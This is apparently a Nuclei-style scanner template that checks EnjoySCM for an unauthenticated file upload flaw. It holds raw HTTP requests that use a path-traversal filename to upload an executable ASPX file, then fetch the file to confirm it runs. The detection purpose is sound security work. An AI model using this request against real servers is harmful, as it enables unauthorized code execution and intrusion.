id: poc-yaml-enjoyscm-uploadfile-upload
info:
  name: 捷诚EnjoySCM UploadFile 文件上传漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: 文件上传
  description: |
    This template checks for a file upload vulnerability in EnjoySCM allowing unauthorized file creation and execution.

variables:
  filename: '{{to_lower(rand_base(10))}}'

flow: |
  http(1) && http(2)

http:
  - raw:
      - |
        POST /File/UploadFile HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=---------------------------21909179191068471382830692394

        -----------------------------21909179191068471382830692394
        Content-Disposition: form-data; name="file"; filename="../../../{{filename}}.aspx"
        Content-Type: image/jpeg

        <% Response.Write("Hello World") %>
        -----------------------------21909179191068471382830692394
        Content-Disposition: form-data; name="action"

        unloadfile
        -----------------------------21909179191068471382830692394
        Content-Disposition: form-data; name="filepath"


        -----------------------------21909179191068471382830692394
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"ObjectData\""
          - "\"UniqueKey\""

  - raw:
      - |
        GET /{{filename}}.aspx HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Hello World"
